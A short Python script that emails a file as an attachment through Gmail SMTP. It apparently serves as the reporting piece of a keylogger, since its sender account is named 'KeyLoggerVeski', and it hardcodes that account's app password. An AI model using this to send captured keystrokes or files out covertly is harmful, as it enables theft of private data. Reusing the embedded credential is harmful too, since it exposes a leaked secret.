import os
import datetime
import time


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def email_alert(subject,body,to, filename=""):
    msg = MIMEMultipart()
    
    msg['subject'] = subject
    msg['to'] = to
    user = "KeyLoggerVeski@gmail.com"
    msg['from'] = user
    password = "sslezqomykvdhggd"
    
    msg.attach(MIMEText(body,'plain'))
    
    if os.path.exists(filename):
        attachment = open(filename,"rb")
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition','attachment; filename=' + filename)
        msg.attach(part)
    else:
        print("file not exist")
        
        
    
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(user,password)
    server.send_message(msg)
    
    server.quit()

if __name__ == '__main__':
    email_alert("a moi mm test","Hello world","KeyLoggerVeski@gmail.com","test.txt")